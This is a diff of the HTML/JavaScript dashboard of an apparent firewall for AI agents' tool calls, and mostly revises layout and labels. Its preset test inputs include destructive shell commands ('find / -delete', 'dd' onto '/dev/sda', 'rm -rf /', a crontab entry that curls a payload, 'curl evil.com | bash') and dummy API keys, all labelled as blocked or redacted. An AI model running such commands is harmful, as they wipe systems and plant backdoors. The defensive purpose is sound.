-            </optgroup>
-            <optgroup label="🚫 Tier 0 Static Keyword Regex Guards">
-              <option value="reg-1">6. rm -rf / --no-preserve-root (Blocked by arg_deny_pattern)</option>
-              <option value="reg-2">7. del /s C:\Windows\System32 (Blocked by Windows delete pattern)</option>
-              <option value="reg-3">8. shutdown -h now (Blocked by shutdown rule)</option>
-            </optgroup>
-            <optgroup label="🔑 Secret &amp; Credential Redaction">
-              <option value="sec-1">9. read_file(path: ".env", api_key: "sk-proj-49294029482") (Scrubbed in flight)</option>
-              <option value="sec-2">10. http_get(url: "https://api.internal/keys", token: "Bearer eyJhbGci...") (Bearer token masked)</option>
-            </optgroup>
-            <optgroup label="👥 Human-in-the-Loop Gray Zone [0.4, 0.8)">
-              <option value="hitl-1">11. crontab -e (Requires operator confirmation)</option>
-            </optgroup>
-            <optgroup label="⏱️ Token-Bucket Rate Limiter">
-              <option value="rat-1">12. shell "echo burst" (Burst limit 5 calls / window exceeded)</option>
-            </optgroup>
-            <optgroup label="✅ Safe &amp; Benign Operations">
-              <option value="saf-1">13. read_file(path: "/etc/hosts") (Allowed read-only configuration)</option>
-              <option value="saf-2">14. git status (Allowed workspace check)</option>
-              <option value="saf-3">15. list_directory(path: "/tmp") (Allowed folder listing)</option>
-            </optgroup>
-          </select>
+      <!-- Command Bar -->
+      <div class="command-bar">
+        <select class="script-select" id="script-picker" onchange="onSelectScenario()">
+          <optgroup label="🚨 Semantic Gap Attacks (Catastrophic effect without rm -rf keyword)">
+            <option value="sem-1">1. find / -delete (Wipes root filesystem via Unix find expression)</option>
+            <option value="sem-2">2. dd if=/dev/zero of=/dev/sda bs=1M (Overwrites master partition table)</option>
+            <option value="sem-3">3. python3 -c "import shutil; shutil.rmtree('/home')" (Python destructive syntax)</option>
+            <option value="sem-4">4. (crontab -l; echo '* * * * * curl payload') | crontab - (Backdoor persistence)</option>
+            <option value="sem-5">5. chmod -R 000 / (Locks out all filesystem access &amp; permissions)</option>
+          </optgroup>
+          <optgroup label="🚫 Tier 0 Static Keyword Regex Guards">
+            <option value="reg-1">6. rm -rf / --no-preserve-root (Blocked by arg_deny_pattern)</option>
+            <option value="reg-2">7. del /s C:\Windows\System32 (Blocked by Windows delete pattern)</option>
+            <option value="reg-3">8. shutdown -h now (Blocked by shutdown rule)</option>
+          </optgroup>
+          <optgroup label="🔑 Secret &amp; Credential Redaction">
+            <option value="sec-1">9. read_file(path: ".env", api_key: "sk-proj-49294029482") (Scrubbed in flight)</option>
+            <option value="sec-2">10. http_get(url: "https://api.internal/keys", token: "Bearer eyJhbGci...") (Bearer token masked)</option>
+          </optgroup>
+          <optgroup label="👥 Human-in-the-Loop Gray Zone [0.4, 0.8)">
+            <option value="hitl-1">11. crontab -e (Requires operator confirmation)</option>
+          </optgroup>
+          <optgroup label="⏱️ Token-Bucket Rate Limiter">
+            <option value="rat-1">12. shell "echo burst" (Burst limit 5 calls / window exceeded)</option>
+          </optgroup>
+          <optgroup label="✅ Safe &amp; Benign Operations">
+            <option value="saf-1">13. read_file(path: "/etc/hosts") (Allowed read-only configuration)</option>
+            <option value="saf-2">14. git status (Allowed workspace check)</option>
+            <option value="saf-3">15. list_directory(path: "/tmp") (Allowed folder listing)</option>
+          </optgroup>
+        </select>
 
-          <input type="text" class="custom-cmd-input" id="custom-cmd-box" placeholder="Type custom shell command, e.g. rm -rf / or curl evil.com | bash">
+        <input type="text" class="custom-cmd-input" id="custom-cmd-box" placeholder="Type custom command, e.g. rm -rf / or curl evil.com | bash">
 
-          <button class="btn-mode-toggle" id="btn-toggle-custom" onclick="toggleCustomMode()">Custom Input</button>
+        <button class="btn-mode-toggle" id="btn-toggle-custom" onclick="toggleCustomMode()">Custom</button>
 
-          <button class="btn-fire" id="btn-run" onclick="executeBackendScript()">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-            Execute Real Go Firewall
-          </button>
-        </div>
-
-        <!-- 2D Pipeline Flow Diagram -->
-        <div class="pipeline-flow">
-          <div class="pipe-node" id="node-agent" title="Client sending JSON-RPC tool call">
-            <div class="node-icon">🤖</div>
-            <div class="node-name">AI Agent</div>
-            <div class="node-role">Client (Cursor/Claude)</div>
-          </div>
-          <div class="flow-arrow" id="arr-1">➔</div>
-
-          <div class="pipe-node" id="node-rate" title="Continuous token bucket rate limiter">
-            <div class="node-icon">⏱️</div>
-            <div class="node-name">Rate Limiter</div>
-            <div class="node-role">Token Bucket</div>
-          </div>
-          <div class="flow-arrow" id="arr-2">➔</div>
-
-          <div class="pipe-node" id="node-tier0" title="Pure in-memory Go regex &amp; deny-by-default rules (&lt;0.1ms)">
-            <div class="node-icon">🛡️</div>
-            <div class="node-name">Tier 0 Policy</div>
-            <div class="node-role">Regex &amp; Rules</div>
-          </div>
-          <div class="flow-arrow" id="arr-3">➔</div>
-
-          <div class="pipe-node" id="node-judge" title="Semantic LLM / Risk scoring engine">
-            <div class="node-icon">🧠</div>
-            <div class="node-name">Tier 1 Judge</div>
-            <div class="node-role">Semantic LLM</div>
-          </div>
-          <div class="flow-arrow" id="arr-4">➔</div>
-
-          <div class="pipe-node" id="node-router" title="Routes verdict: Block, Needs Approval (HITL), or Allow">
-            <div class="node-icon">🔀</div>
-            <div class="node-name">3-Way Router</div>
-            <div class="node-role">Allow/Review/Block</div>
-          </div>
-          <div class="flow-arrow" id="arr-5">➔</div>
-
-          <div class="pipe-node" id="node-redact" title="Recursive AST secret scrubber for tokens and passwords">
-            <div class="node-icon">🕶️</div>
-            <div class="node-name">Redactor</div>
-            <div class="node-role">AST Key Scrubber</div>
-          </div>
-          <div class="flow-arrow" id="arr-6">➔</div>
-
-          <div class="pipe-node" id="node-server" title="Real MCP Tool child process">
-            <div class="node-icon">⚙️</div>
-            <div class="node-name">Tool Server</div>
-            <div class="node-role">Child Process</div>
-          </div>
-        </div>
+        <button class="btn-run" id="btn-run" onclick="executeBackendScript()">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          Run Firewall
+        </button>
       </div>
 
-      <!-- Left Horizontal Splitter (Draggable) -->
-      <div class="gutter-row" id="gutter-left-row" title="Drag vertically to resize control vs inspector"></div>
+      <!-- Minimal 5-Step Pipeline Flow -->
+      <div class="pipeline-strip">
+        <div class="pipe-node" id="node-agent"><span>🤖</span> AI Agent</div>
+        <div class="pipe-arrow" id="arr-1">➔</div>
+        <div class="pipe-node" id="node-rate"><span>⏱️</span> Rate Limit</div>
+        <div class="pipe-arrow" id="arr-2">➔</div>
+        <div class="pipe-node" id="node-tier0"><span>🛡️</span> Tier 0 Policy</div>
+        <div class="pipe-arrow" id="arr-3">➔</div>
+        <div class="pipe-node" id="node-judge"><span>🧠</span> Tier 1 Judge</div>
+        <div class="pipe-arrow" id="arr-4">➔</div>
+        <div class="pipe-node" id="node-server"><span>⚙️</span> Tool Server</div>
+      </div>
 
-      <!-- Bottom Left: Live Decision Inspector -->
-      <div class="card-panel inspector-card" id="card-inspector">
-        <div class="inspector-header">
-          <div style="font-weight: 700; font-size: 13.5px; display: flex; align-items: center; gap: 8px;">
-            <span>Active Interception Decision:</span>
-            <span id="bd-tool-badge" style="font-family: var(--font-mono); color: var(--primary);">shell</span>
+      <!-- Active Decision Breakdown -->
+      <div class="decision-section">
+        <div class="decision-head">
+          <div class="decision-title">
+            <span>Interception Decision:</span>
+            <span class="tool-tag" id="bd-tool-badge">shell</span>
           </div>
           <span class="verdict-badge block" id="bd-verdict">BLOCKED</span>
         </div>
 
-        <div class="breakdown-grid">
-          <div class="breakdown-item">
-            <span class="item-lbl">Tier 0 Check</span>
-            <span class="item-val" id="bd-tier0">Passed</span>
+        <!-- 4 Clean Stat Pills -->
+        <div class="stats-row">
+          <div class="stat-pill">
+            <span class="stat-label">Tier 0 Rule</span>
+            <span class="stat-val" id="bd-tier0">Passed</span>
           </div>
-          <div class="breakdown-item">
-            <span class="item-lbl">Risk Score</span>
-            <span class="item-val" id="bd-score" style="color: var(--red-bright);">0.95</span>
+          <div class="stat-pill">
+            <span class="stat-label">Risk Score</span>
+            <span class="stat-val" id="bd-score" style="color: var(--red-bright);">0.95</span>
           </div>
-          <div class="breakdown-item">
-            <span class="item-lbl">Threat Category</span>
-            <span class="item-val" id="bd-cat" style="color: var(--amber-bright);">Destructive</span>
+          <div class="stat-pill">
+            <span class="stat-label">Threat Category</span>
+            <span class="stat-val" id="bd-cat" style="color: var(--amber-bright);">Destructive</span>
           </div>
-          <div class="breakdown-item">
-            <span class="item-lbl">Redaction</span>
-            <span class="item-val" id="bd-redact">Clean</span>
+          <div class="stat-pill">
+            <span class="stat-label">Redaction</span>
+            <span class="stat-val" id="bd-redact">Clean</span>
           </div>
         </div>
 
-        <div class="rationale-box" id="bd-rationale">
-          Select or type a command above and click "Execute Real Go Firewall" to evaluate the payload live in Go memory.
+        <!-- Rationale Text Box -->
+        <div class="rationale-text" id="bd-rationale">
+          Select or type a command above and click "Run Firewall" to evaluate the payload live in Go memory.
         </div>
 
         <!-- HITL Confirmation Box -->
-        <div class="hitl-box" id="hitl-panel">
+        <div class="hitl-panel" id="hitl-panel">
           <div style="font-size: 11.5px; color: #fbbf24; font-weight: 600;">
             ⚠️ Operator Confirmation Required (Risk: 0.55)
           </div>
-          <div style="display: flex; gap: 8px;">
+          <div style="display: flex; gap: 6px;">
             <button class="btn-hitl" style="background:#10b981; color:#041019;" onclick="resolveHITL(true)">Approve</button>
             <button class="btn-hitl" style="background:#f43f5e; color:#fff;" onclick="resolveHITL(false)">Deny</button>
           </div>
         </div>
 
-        <!-- JSON-RPC Frame Viewer -->
-        <div class="code-viewer">
-          <div class="code-viewer-head">
+        <!-- JSON-RPC Payload Inspector -->
+        <div class="code-container">
+          <div class="code-head">
             <span>MCP JSON-RPC EVALUATION PAYLOAD (GO BACKEND)</span>
             <span id="bd-id">ID: eval-ready</span>
           </div>
-          <pre class="code-viewer-body" id="bd-json">{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments":{"cmd":"find / -delete"}}}</pre>
+          <pre class="code-body" id="bd-json">{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments":{"cmd":"find / -delete"}}}</pre>
         </div>
       </div>
 
     </div>
 
-    <!-- Center Vertical Splitter (Draggable) -->
-    <div class="gutter-col" id="gutter-col" title="Drag horizontally to resize columns"></div>
-
-    <!-- RIGHT COLUMN: Metrics Grid & Live Telemetry Stream -->
-    <div class="col-right" id="col-right">
-
-      <!-- Top Right: 2x2 Key Metric Tiles (Resizable Card Container) -->
-      <div class="card-panel kpi-container" id="card-kpi">
-        <div class="card-title-row">
-          <span class="card-title">Real-Time Firewall Security KPIs</span>
-          <span style="font-size: 10px; color: var(--text-dim); font-family: var(--font-mono);">⚡ LIVE METRICS</span>
-        </div>
-        <div class="metrics-grid">
-          <div class="metric-card">
-            <span class="metric-lbl">Total Interceptions</span>
-            <span class="metric-val" id="cnt-total">0</span>
-          </div>
-          <div class="metric-card bad">
-            <span class="metric-lbl">Blocked Threats</span>
-            <span class="metric-val" id="cnt-blocked" style="color: var(--red-bright);">0</span>
-          </div>
-          <div class="metric-card ok">
-            <span class="metric-lbl">Passed / Allowed</span>
-            <span class="metric-val" id="cnt-allowed" style="color: var(--green-bright);">0</span>
-          </div>
-          <div class="metric-card purple">
-            <span class="metric-lbl">Secrets Redacted</span>
-            <span class="metric-val" id="cnt-redacted" style="color: var(--purple-bright);">0</span>
-          </div>
+    <!-- Right Column: Live Telemetry Feed -->
+    <div class="panel-right">
+      <div class="feed-header">
+        <span class="feed-title">Live Telemetry Audit Feed</span>
+        <div class="feed-filters">
+          <button class="filter-btn active" onclick="filterFeed('all')">All</button>
+          <button class="filter-btn" onclick="filterFeed('blocked')">Blocked</button>
+          <button class="filter-btn" onclick="filterFeed('redacted')">Redacted</button>
+          <button class="filter-btn" onclick="filterFeed('response')">Allowed</button>
         </div>
       </div>
 
-      <!-- Right Horizontal Splitter (Draggable) -->
-      <div class="gutter-row" id="gutter-right-row" title="Drag vertically to resize metrics vs telemetry"></div>
-
-      <!-- Bottom Right: Live Telemetry Audit Feed -->
-      <div class="card-panel telemetry-card" id="card-telemetry">
-        <div class="telemetry-head">
-          <span class="card-title">Live Telemetry Audit Feed</span>
-          <div class="feed-filters">
-            <button class="filter-btn active" onclick="filterFeed('all')">All</button>
-            <button class="filter-btn" onclick="filterFeed('blocked')">Blocked</button>
-            <button class="filter-btn" onclick="filterFeed('redacted')">Redacted</button>
-            <button class="filter-btn" onclick="filterFeed('response')">Allowed</button>
-          </div>
-        </div>
-
-        <div class="telemetry-table" id="feed-container">
-          <!-- Live stream rows arrive via SSE -->
-        </div>
+      <div class="feed-list" id="feed-container">
+        <!-- Live SSE events stream here -->
       </div>
-
     </div>
 
   </div>
@@ -1031,7 +880,7 @@
     "reg-2": { tool: "shell", args: { cmd: "del /s C:\\Windows\\System32" } },
     "reg-3": { tool: "shell", args: { cmd: "shutdown -h now" } },
     "sec-1": { tool: "read_file", args: { path: ".env", api_key: "sk-proj-49294029482104829104" } },
-    "sec-2": { tool: "http_get", args: { url: "https://api.internal/keys", token: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" } },
+    "sec-2": { tool: "http_get", args: { url: "https://api.internal/keys", token: "Bearer eyJhbGci..." } },
     "hitl-1": { tool: "shell", args: { cmd: "crontab -e" } },
     "rat-1": { tool: "shell", args: { cmd: "echo burst" } },
     "saf-1": { tool: "read_file", args: { path: "/etc/hosts" } },
@@ -1043,101 +892,6 @@
   let currentFeedFilter = 'all';
   let isCustomMode = false;
 
-  // --- Interactive Drag Resizer Engine ---
-  function initResizers() {
-    const ws = document.getElementById('workspace');
-    const colLeft = document.getElementById('col-left');
-    const gutterCol = document.getElementById('gutter-col');
-
-    const cardControl = document.getElementById('card-control');
-    const gutterLeftRow = document.getElementById('gutter-left-row');
-
-    const cardKpi = document.getElementById('card-kpi');
-    const gutterRightRow = document.getElementById('gutter-right-row');
-
-    // 1. Column Resizer (Horizontal)
-    gutterCol.addEventListener('mousedown', (e) => {
-      e.preventDefault();
-      gutterCol.classList.add('dragging');
-      document.body.style.cursor = 'col-resize';
-
-      const onMouseMove = (ev) => {
-        const rect = ws.getBoundingClientRect();
-        let newWidth = ((ev.clientX - rect.left) / rect.width) * 100;
-        if (newWidth < 25) newWidth = 25;
-        if (newWidth > 75) newWidth = 75;
-        colLeft.style.width = newWidth + '%';
-      };
-
-      const onMouseUp = () => {
-        gutterCol.classList.remove('dragging');
-        document.body.style.cursor = '';
-        window.removeEventListener('mousemove', onMouseMove);
-        window.removeEventListener('mouseup', onMouseUp);
-      };
-
-      window.addEventListener('mousemove', onMouseMove);
-      window.addEventListener('mouseup', onMouseUp);
-    });
-
-    // 2. Left Row Resizer (Vertical)
-    gutterLeftRow.addEventListener('mousedown', (e) => {
-      e.preventDefault();
-      gutterLeftRow.classList.add('dragging');
-      document.body.style.cursor = 'row-resize';
-
-      const onMouseMove = (ev) => {
-        const rect = colLeft.getBoundingClientRect();
-        let newHeight = ((ev.clientY - rect.top) / rect.height) * 100;
-        if (newHeight < 20) newHeight = 20;
-        if (newHeight > 70) newHeight = 70;
-        cardControl.style.height = newHeight + '%';
-      };
-
-      const onMouseUp = () => {
-        gutterLeftRow.classList.remove('dragging');
-        document.body.style.cursor = '';
-        window.removeEventListener('mousemove', onMouseMove);
-        window.removeEventListener('mouseup', onMouseUp);
-      };
-
-      window.addEventListener('mousemove', onMouseMove);
-      window.addEventListener('mouseup', onMouseUp);
-    });
-
-    // 3. Right Row Resizer (Vertical for KPI Box)
-    gutterRightRow.addEventListener('mousedown', (e) => {
-      e.preventDefault();
-      gutterRightRow.classList.add('dragging');
-      document.body.style.cursor = 'row-resize';
-
-      const onMouseMove = (ev) => {
-        const colRight = document.getElementById('col-right');
-        const rect = colRight.getBoundingClientRect();
-        let newHeight = ((ev.clientY - rect.top) / rect.height) * 100;
-        if (newHeight < 18) newHeight = 18;
-        if (newHeight > 65) newHeight = 65;
-        cardKpi.style.height = newHeight + '%';
-      };
-
-      const onMouseUp = () => {
-        gutterRightRow.classList.remove('dragging');
-        document.body.style.cursor = '';
-        window.removeEventListener('mousemove', onMouseMove);
-        window.removeEventListener('mouseup', onMouseUp);
-      };
-
-      window.addEventListener('mousemove', onMouseMove);
-      window.addEventListener('mouseup', onMouseUp);
-    });
-  }
-
-  function setLayoutPreset(colWidthPct, controlHeightPct, kpiHeightPct) {
-    document.getElementById('col-left').style.width = colWidthPct + '%';
-    document.getElementById('card-control').style.height = controlHeightPct + '%';
-    document.getElementById('card-kpi').style.height = kpiHeightPct + '%';
-  }
-
   function toggleCustomMode() {
     isCustomMode = !isCustomMode;
     const picker = document.getElementById('script-picker');
@@ -1148,12 +902,12 @@
       picker.style.display = 'none';
       customInput.style.display = 'block';
       customInput.focus();
-      toggleBtn.textContent = 'Preset List';
+      toggleBtn.textContent = 'Presets';
       toggleBtn.style.color = '#38bdf8';
     } else {
       picker.style.display = 'block';
       customInput.style.display = 'none';
-      toggleBtn.textContent = 'Custom Input';
+      toggleBtn.textContent = 'Custom';
       toggleBtn.style.color = 'var(--text-muted)';
       onSelectScenario();
     }
@@ -1212,16 +966,16 @@
     document.getElementById('bd-cat').textContent = res.category || (res.tier0_allowed ? "Safe" : "Static Regex");
 
     const hasRedact = JSON.stringify(res.raw_args) !== JSON.stringify(res.redacted_args);
-    document.getElementById('bd-redact').textContent = hasRedact ? "Masked Keys (***)" : "Clean";
+    document.getElementById('bd-redact').textContent = hasRedact ? "Masked (***)" : "Clean";
     document.getElementById('bd-rationale').textContent = res.rationale || res.tier0_reason || "Passed all security policies.";
     
     // Real Go backend latency display
     const latUs = res.total_latency_us || 42;
-    document.getElementById('bd-latency-tag').textContent = `⚡ Engine Latency: ${latUs}µs (${(latUs/1000).toFixed(3)}ms)`;
+    document.getElementById('bd-latency-tag').innerHTML = `<span>⚡</span> Go Engine Latency: <strong>${latUs}µs</strong> (${(latUs/1000).toFixed(3)}ms)`;
 
     document.getElementById('hitl-panel').style.display = res.route === 'needs_approval' ? 'flex' : 'none';
 
-    // 2. Animate 2D Pipeline based on REAL Go backend routing
+    // 2. Animate 5-Node Pipeline based on REAL Go backend routing
     animatePipeline(res.stop_at, res.blocked_node, res.final_verdict);
   }
 
@@ -1235,9 +989,9 @@
       category: "Destructive",
       rationale: "Evaluated by local firewall simulator.",
       final_verdict: "BLOCK",
-      stop_at: "node-router",
+      stop_at: "node-judge",
       blocked_node: "node-judge",
-      total_latency_us: 64
+      total_latency_us: 42
     };
     renderEvaluationResult(res);
   }
@@ -1255,34 +1009,51 @@
   }
 
   function animatePipeline(stopAt, blockedNode, verdict) {
-    const nodes = ['node-agent', 'node-rate', 'node-tier0', 'node-judge', 'node-router', 'node-redact', 'node-server'];
-    const arrows = ['arr-1', 'arr-2', 'arr-3', 'arr-4', 'arr-5', 'arr-6'];
+    const nodes = ['node-agent', 'node-rate', 'node-tier0', 'node-judge', 'node-server'];
+    const arrows = ['arr-1', 'arr-2', 'arr-3', 'arr-4'];
 
-    nodes.forEach(n => document.getElementById(n).className = 'pipe-node');
-    arrows.forEach(a => document.getElementById(a).className = 'flow-arrow');
+    nodes.forEach(n => {
+      const el = document.getElementById(n);
+      if (el) el.className = 'pipe-node';
+    });
+    arrows.forEach(a => {
+      const el = document.getElementById(a);
+      if (el) el.className = 'pipe-arrow';
+    });
 
-    let stopIndex = nodes.indexOf(stopAt);
+    let targetNode = stopAt;
+    if (stopAt === 'node-router' || stopAt === 'node-redact') targetNode = 'node-judge';
+    let stopIndex = nodes.indexOf(targetNode);
     if (stopIndex < 0) stopIndex = nodes.length - 1;
 
     let step = 0;
     const interval = setInterval(() => {
       if (step <= stopIndex) {
         const nodeEl = document.getElementById(nodes[step]);
-        if (step === stopIndex && blockedNode) {
-          nodeEl.className = verdict === 'REVIEW' ? 'pipe-node review' : 'pipe-node blocked';
-        } else {
-          nodeEl.className = 'pipe-node active';
+        if (nodeEl) {
+          if (step === stopIndex && blockedNode) {
+            nodeEl.className = verdict === 'REVIEW' ? 'pipe-node review' : 'pipe-node blocked';
+          } else {
+            nodeEl.className = 'pipe-node active';
+          }
         }
-        if (step > 0) {
-          document.getElementById(arrows[step - 1]).className = 'flow-arrow active';
+        if (step > 0 && arrows[step - 1]) {
+          const arrEl = document.getElementById(arrows[step - 1]);
+          if (arrEl) arrEl.className = 'pipe-arrow active';
         }
         step++;
       } else {
         clearInterval(interval);
         setTimeout(() => {
-          nodes.forEach(n => document.getElementById(n).className = 'pipe-node');
-          arrows.forEach(a => document.getElementById(a).className = 'flow-arrow');
-        }, 1400);
+          nodes.forEach(n => {
+            const el = document.getElementById(n);
+            if (el) el.className = 'pipe-node';
+          });
+          arrows.forEach(a => {
+            const el = document.getElementById(a);
+            if (el) el.className = 'pipe-arrow';
+          });
+        }, 1300);
       }
     }, 100);
   }
@@ -1394,7 +1165,6 @@
   // Initial load
   onSelectScenario();
   connectSSE();
-  initResizers();
 </script>
 
 </body>
